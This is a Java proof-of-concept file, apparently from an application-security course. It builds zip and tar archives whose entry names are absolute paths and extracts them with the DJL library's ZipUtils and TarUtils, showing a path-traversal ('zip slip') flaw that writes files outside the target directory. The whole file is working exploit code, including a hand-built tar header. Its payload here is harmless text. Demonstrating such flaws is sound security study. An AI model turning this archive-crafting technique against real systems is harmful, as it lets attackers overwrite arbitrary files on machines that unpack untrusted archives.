package org.example;

import ai.djl.util.TarUtils;
import ai.djl.util.ZipUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class AIDjlAttack {

    public static void main(String[] args) throws IOException {
        mainTar();
        mainZip();
    }

    public static void mainZip() throws IOException {
        String zipFileName = "exposed/djl-exploit.zip";
        String fileNameInsideZip = "/Users/mmvpm/Courses/app-sec-course/exposed/r/r/r/djl-bad-file-from-zip.txt";
        createZip(zipFileName, fileNameInsideZip, "Some file content");

        File destDir = new File("exposed/djl-unzipped-zip");
        destDir.mkdir();

        ZipUtils.unzip(new FileInputStream(zipFileName), destDir.toPath());
    }

    public static void mainTar() throws IOException {
        String tarFileName = "exposed/djl-exploit.tar";
        String fileNameInsideTar = "/Users/mmvpm/Courses/app-sec-course/exposed/djl-bad-file-from-tar.txt";
        createTar(tarFileName, fileNameInsideTar, "Some file content");

        File destDir = new File("exposed/djl-unzipped-tar");
        destDir.mkdir();

        TarUtils.untar(new FileInputStream(tarFileName), destDir.toPath(), false);
    }

    private static void createZip(String zipFileName, String entryName, String fileContent) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(zipFileName);
             ZipOutputStream zipOut = new ZipOutputStream(fos)) {
            ZipEntry zipEntry = new ZipEntry(entryName);
            zipOut.putNextEntry(zipEntry);
            zipOut.write(fileContent.getBytes());
            zipOut.closeEntry();
        }
    }

    private static void createTar(String tarFileName, String entryName, String fileContent) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(tarFileName)) {
            byte[] data = fileContent.getBytes();
            byte[] header = new byte[512];
            byte[] nameBytes = entryName.getBytes();
            System.arraycopy(nameBytes, 0, header, 0, Math.min(nameBytes.length, 100));
            String mode = "0000644";
            System.arraycopy(mode.getBytes(), 0, header, 100, 7);
            String uid = "0000000";
            String gid = "0000000";
            System.arraycopy(uid.getBytes(), 0, header, 108, 7);
            System.arraycopy(gid.getBytes(), 0, header, 116, 7);
            String size = String.format("%011o", data.length);
            System.arraycopy(size.getBytes(), 0, header, 124, 11);
            String mtime = String.format("%011o", System.currentTimeMillis() / 1000);
            System.arraycopy(mtime.getBytes(), 0, header, 136, 11);
            Arrays.fill(header, 148, 156, (byte) ' ');
            header[156] = '0';
            int checksum = 0;
            for (byte b : header) {
                checksum += (b & 0xFF);
            }
            String checksumStr = String.format("%06o", checksum) + "\0 ";
            System.arraycopy(checksumStr.getBytes(), 0, header, 148, 8);
            fos.write(header);
            fos.write(data);
            int padding = 512 - (data.length % 512);
            if (padding < 512) {
                byte[] padBytes = new byte[padding];
                fos.write(padBytes);
            }
            byte[] endBlocks = new byte[1024];
            fos.write(endBlocks);
        }
    }
}
